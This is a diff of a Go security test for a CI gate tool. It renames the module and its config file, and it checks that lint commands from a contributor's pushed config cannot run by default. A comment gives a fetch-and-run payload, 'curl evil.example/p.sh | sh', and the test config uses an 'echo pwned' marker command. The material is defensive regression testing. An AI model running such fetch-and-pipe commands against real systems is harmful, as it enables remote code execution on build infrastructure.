@@ -9,12 +9,12 @@ import (
 	"testing"
 	"time"
 
-	"github.com/kunchenguid/no-mistakes/internal/types"
+	"github.com/Blakeolson21/no-slop/internal/types"
 )
 
 // TestRepoConfigCommandsFromDefaultBranch proves the supply-chain RCE fix
 // (audit finding #1): the code-executing fields commands.* are loaded from the
-// trusted default-branch copy of .no-mistakes.yaml, never from a contributor's
+// trusted default-branch copy of .no-slop.yaml, never from a contributor's
 // pushed SHA. A feature branch ships a malicious lint command that writes a
 // marker file; under the secure default the marker must never appear, while an
 // explicit allow_repo_commands opt-in must run it — so the assertion is known
@@ -95,7 +95,7 @@ func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 		// command in the same pushed copy. Both must be ignored: the trusted
 		// default-branch copy controls the switch.
 		selfEnableConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\nallow_repo_commands: true\ncommands:\n  lint: \"echo pwned > %s\"\n", markerPath)
-		h.CommitChange(branch, ".no-mistakes.yaml", selfEnableConfig, "self-enable + malicious lint")
+		h.CommitChange(branch, ".no-slop.yaml", selfEnableConfig, "self-enable + malicious lint")
 		h.PushToGate(branch)
 
 		run := h.WaitForRun(branch, 90*time.Second)
@@ -110,9 +110,9 @@ func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
 }
 
 // pushMaliciousRepoConfig creates a feature branch carrying a hostile
-// .no-mistakes.yaml whose lint command writes a marker file, pushes it through
+// .no-slop.yaml whose lint command writes a marker file, pushes it through
 // the gate, and returns the marker path the test should assert on. The
-// default-branch .no-mistakes.yaml (written by the harness) carries no
+// default-branch .no-slop.yaml (written by the harness) carries no
 // commands, so it is the trusted source and yields empty commands under the
 // secure default.
 func pushMaliciousRepoConfig(t *testing.T, h *Harness, branch string) string {
@@ -125,7 +125,7 @@ func pushMaliciousRepoConfig(t *testing.T, h *Harness, branch string) string {
 	// The malicious payload: in the wild this would be
 	// "curl evil.example/p.sh | sh". Here it writes a marker the test can see.
 	maliciousConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\ncommands:\n  lint: \"echo pwned > %s\"\n", markerPath)
-	h.CommitChange(branch, ".no-mistakes.yaml", maliciousConfig, "configure malicious lint command")
+	h.CommitChange(branch, ".no-slop.yaml", maliciousConfig, "configure malicious lint command")
 
 	h.PushToGate(branch)
 	return markerPath
